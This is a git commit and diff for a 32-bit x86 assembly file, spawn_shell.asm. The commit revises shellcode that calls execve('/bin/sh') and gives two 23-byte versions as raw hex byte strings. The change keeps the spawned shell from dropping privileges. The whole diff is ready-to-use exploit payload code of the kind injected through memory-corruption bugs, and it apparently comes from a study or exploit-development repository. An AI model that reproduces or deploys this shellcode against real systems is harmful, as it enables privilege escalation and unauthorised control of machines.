b8204681d970c6183587e33afb73a5a01dacc555
gedetrt <trisna.quebe@hva.nl>
2021-03-24 13:53:36 +0100

    execve dropping privileges bug fixed

--- 32_bit/spawn_shell/spawn_shell.asm
+++ 32_bit/spawn_shell/spawn_shell.asm
@@ -1,7 +1,12 @@
 
 ; x32 bit shellcode by Trisna
 ; 23 bytes long
+
+; Version1:
 ; \x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80
+
+; Version2:
+; \x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
 
 section .text
 global _start
@@ -14,7 +19,14 @@ _start:
 	push 0x68732f6e
 	push 0x69622f2f
 	mov ebx, esp		; move stack buffer to ebx
-	xor ecx, ecx
-	xor edx, edx
-	mov al, 0xb		; execve()
+
+	; fill //bin/sh in the second parameter.
+	push eax
+	push ebx
+	mov ecx, esp
+
+	; set the syscall number.
+	mov al, 0xb		; execve
 	int 0x80
+
+	; execve("/bin/sh", ["/bin/sh"], NULL)
